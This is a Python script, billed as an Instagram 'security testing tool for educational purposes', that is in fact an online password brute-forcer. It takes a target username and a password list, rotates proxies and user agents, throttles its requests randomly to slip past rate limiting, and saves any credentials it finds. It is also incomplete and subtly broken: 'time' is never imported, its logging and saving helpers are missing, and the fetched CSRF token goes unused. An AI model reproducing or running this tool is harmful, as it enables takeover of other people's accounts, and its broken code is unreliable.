import re
import asyncio
import random
import aiofiles
from aiohttp import ClientSession, ClientTimeout
from aiohttp_socks import ProxyConnector
import ssl
import os
import json
from typing import List, Tuple, Optional

# Configuration
CONFIG = {
    "proxy_pool": [
        "brd.superproxy.io:33335",
        "brd.superproxy.io:33336",
        "brd.superproxy.io:33337"
    ],
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
    ],
    "request_timeout": 30,
    "max_retries": 3,
    "throttle_delay": (1, 3),
    "log_file": "attempts.log"
}

class Color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class InstagramBruteForce:
    def __init__(self):
        self.ssl_context = ssl.create_default_context()
        self.session = None
        self.current_proxy = None
        self.current_user_agent = None

    async def initialize_session(self, use_proxy: bool) -> bool:
        """Initialize HTTP session with random proxy and user agent"""
        try:
            self.current_user_agent = random.choice(CONFIG["user_agents"])
            
            if use_proxy:
                self.current_proxy = random.choice(CONFIG["proxy_pool"])
                connector = ProxyConnector.from_url(
                    f"socks5://{self.current_proxy}",
                    ssl=self.ssl_context
                )
            else:
                connector = None

            self.session = ClientSession(
                connector=connector,
                timeout=ClientTimeout(total=CONFIG["request_timeout"]),
                headers={"User-Agent": self.current_user_agent}
            )
            return True
        except Exception as e:
            self.log_error(f"Session initialization failed: {str(e)}")
            return False

    async def fetch_initial_data(self) -> Tuple[Optional[str], Optional[str], Optional[str]]:
        """Retrieve CSRF token, device ID, and mid"""
        try:
            async with self.session.get(
                "https://www.instagram.com/data/initial_data/",
                allow_redirects=True
            ) as response:
                cookies = response.cookies
                content = await response.text()

                csrf_token = cookies.get("csrftoken", None)
                device_id = re.search(r'"device_id":"([a-zA-Z0-9\-]+)"', content)
                mid = cookies.get("mid", None)

                return (
                    csrf_token.value if csrf_token else None,
                    device_id.group(1) if device_id else None,
                    mid.value if mid else None
                )
        except Exception as e:
            self.log_error(f"Initial data fetch failed: {str(e)}")
            return None, None, None

    async def attempt_login(self, username: str, password: str) -> dict:
        """Execute login attempt with current session"""
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"
        
        data = {
            "enc_password": enc_password,
            "username": username,
            "queryParams": json.dumps({"next": "/"}),
            "optIntoOneTap": "false"
        }

        try:
            async with self.session.post(
                "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                data=data
            ) as response:
                return await response.json()
        except Exception as e:
            self.log_error(f"Login attempt failed: {str(e)}")
            return {"status": "error", "message": str(e)}

    async def execute_attack(self, username: str, password_list: List[str]):
        """Main attack execution flow"""
        for attempt, password in enumerate(password_list, 1):
            try:
                result = await self.attempt_login(username, password)
                
                if result.get("authenticated", False):
                    self.log_success(f"Valid credentials found: {username}:{password}")
                    await self.save_credentials(username, password)
                    return True
                elif result.get("checkpoint_url"):
                    self.log_warning(f"Checkpoint required: {username}:{password}")
                    await self.save_credentials(username, password)
                    return True
                else:
                    self.log_attempt(
                        f"Attempt {attempt}/{len(password_list)} | {password} | {result.get('message', 'Unknown error')}"
                    )

                # Randomized throttling
                await asyncio.sleep(random.uniform(*CONFIG["throttle_delay"]))
                
            except Exception as e:
                self.log_error(f"Attempt failed: {str(e)}")
                if attempt < CONFIG["max_retries"]:
                    await self.initialize_session(use_proxy=True)
        
        return False

    # Additional helper methods for logging, saving results, etc...
    # (Error handling, logging, and result saving implementations would go here)

async def main():
    tool = InstagramBruteForce()
    
    username = input(f"{Color.OKBLUE}Enter target username: {Color.ENDC}")
    password_file = input(f"{Color.OKBLUE}Enter password file path: {Color.ENDC}")
    
    try:
        async with aiofiles.open(password_file, "r") as f:
            passwords = [line.strip() async for line in f]
    except FileNotFoundError:
        print(f"{Color.FAIL}Password file not found!{Color.ENDC}")
        return

    use_proxy = input(f"{Color.OKBLUE}Use proxy? (y/n): {Color.ENDC}").lower() == "y"

    if not await tool.initialize_session(use_proxy):
        return

    csrf_token, device_id, mid = await tool.fetch_initial_data()
    
    if not all([csrf_token, device_id, mid]):
        print(f"{Color.FAIL}Failed to obtain required authentication tokens{Color.ENDC}")
        return

    print(f"{Color.OKGREEN}Starting attack against {username}...{Color.ENDC}")
    success = await tool.execute_attack(username, passwords)
    
    if success:
        print(f"{Color.OKGREEN}Attack succeeded! Check results file.{Color.ENDC}")
    else:
        print(f"{Color.FAIL}Attack completed without success{Color.ENDC}")

if __name__ == "__main__":
    print(f"""{Color.HEADER}
    #############################################
    #  INSTAGRAM SECURITY TESTING TOOL BY HZCV   #
    #        FOR EDUCATIONAL PURPOSES ONLY       #
    #############################################
    {Color.ENDC}""")
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Color.WARNING}Operation cancelled by user{Color.ENDC}")
